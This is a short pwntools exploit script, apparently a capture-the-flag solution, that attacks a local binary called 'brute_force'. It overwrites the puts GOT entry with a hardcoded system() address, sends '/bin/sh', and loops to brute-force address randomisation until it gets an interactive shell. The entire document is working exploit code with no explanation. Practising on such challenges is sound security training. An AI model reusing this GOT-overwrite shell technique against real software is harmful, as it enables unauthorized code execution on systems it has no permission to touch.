from pwn import *

puts_got = 0x804c014
system = 0xf7e0a790

while True:
    p = process("./brute_force")
    p.recvuntil(b"addr : ")
    p.sendline(str(puts_got))
    p.recvuntil(b"value : ")
    p.sendline(str(system))

    p.recvuntil(b"Any comment? ")
    p.send(b"/bin/sh")
    
    try:
        p.sendline(b"id")
        if b"uid" in p.recvline():
            p.interactive()
        else:
            p.close()
    except:
        p.close()
